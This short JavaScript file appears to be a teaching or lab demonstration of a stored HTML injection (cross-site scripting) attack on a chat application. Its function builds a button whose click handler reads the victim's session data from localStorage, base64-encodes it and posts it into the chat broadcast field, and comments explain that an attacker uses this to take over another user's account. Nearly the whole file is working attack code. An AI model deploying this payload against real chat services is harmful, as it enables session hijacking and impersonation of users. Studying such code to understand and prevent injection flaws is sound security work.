function sendMaliciousCode() {
    function doHack() {
        const $broadcastInput = document.querySelector('#broadcast');
        $broadcastInput.value = 'Stolen session data: ' + btoa(localStorage.session_data);
        const kbe = new Object();
        kbe.key = 'Enter';
        kbe.keyCode = 13;
        $broadcastInput.dispatchEvent(new KeyboardEvent('keydown', kbe));
    };

    $fakeButton = `<button onclick="(${doHack.toString()})()">Steal my data!</button>`
    document.querySelector("#broadcast").value = $fakeButton
}

//html injection attack

// a user sends an html with a malicious js script embedded.
// foo wants to hack into nisan's account
// foo sends nisan a chat message with html content
// the html content has javascript inside
// once the javascript runs, it'll send foo nisan's session data
// this way, foo can pretend to be nisan for as long as the token is valid